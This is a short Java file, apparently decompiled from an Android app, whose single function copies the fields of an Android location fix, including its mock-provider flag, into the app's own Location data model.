package com.hawkshaw.library.datalayer.models;

import Y1.K;
import android.location.Location;
import android.os.Build;

public final class LocationKt {
    public static final Location toLocation(Location location) {
        K.n(location, "<this>");
        return new Location(location.getAltitude(), location.getLatitude(), location.getLongitude(), location.getAccuracy(), location.getVerticalAccuracyMeters(), location.getSpeed(), location.getBearing(), location.getProvider(), location.getTime(), Build.VERSION.SDK_INT >= 31 ? location.isMock() : location.isFromMockProvider());
    }
}
